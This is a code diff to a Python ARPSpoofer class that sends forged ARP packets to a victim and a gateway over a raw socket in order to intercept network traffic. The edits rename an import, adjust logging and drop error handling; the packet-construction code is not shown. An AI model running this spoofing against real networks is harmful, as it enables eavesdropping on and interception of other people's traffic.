@@ -17,13 +17,12 @@
 """The module for ARP spoofing class"""
 
 
-import sys
 import socket
 import textwrap
 import time
 import logging
 
-from .validators import make_valid_mac_address, validate_ip_address
+from .helpers import make_valid_mac_address, validate_ip_address
 
 
 _LOGGER = logging.getLogger(__name__)
@@ -43,12 +42,13 @@ class ARPSpoofer:
         """
         self.interface = interface
         self.mac = make_valid_mac_address(your_mac)
-        _LOGGER.debug(
-            "Creating an ARPSpoofer object with your interface %s"
-            " and MAC-address %s",
-            interface,
-            your_mac,
-        )
+        if interface and your_mac:
+            _LOGGER.debug(
+                "Creating an ARPSpoofer object with your interface %s"
+                " and MAC-address %s",
+                self.interface,
+                self.mac,
+            )
         self.description = textwrap.dedent(
             """\
             The ARP spoofing attack description:
@@ -102,14 +102,10 @@ class ARPSpoofer:
         protocol = self._make_prototcol_headers()
         gateway_packet = self._make_packet_for_gateway()
         victim_packet = self._make_packet_for_victim()
-        try:
-            connect = socket.socket(
-                socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
-            )
-            connect.bind((self.interface, socket.htons(0x0800)))
-        except Exception as exc:
-            _LOGGER.error(exc)
-            sys.exit(1)
+        connect = socket.socket(
+            socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
+        )
+        connect.bind((self.interface, socket.htons(0x0800)))
 
         request_victim = (
             victim_packet
@@ -134,9 +130,6 @@ class ARPSpoofer:
                 time.sleep(1)
             except KeyboardInterrupt:
                 _LOGGER.warning("Stopping ARP spoofing attack")
-                break
-            except Exception as exc:
-                _LOGGER.error(exc)
                 break
 
     def _make_prototcol_headers(self):
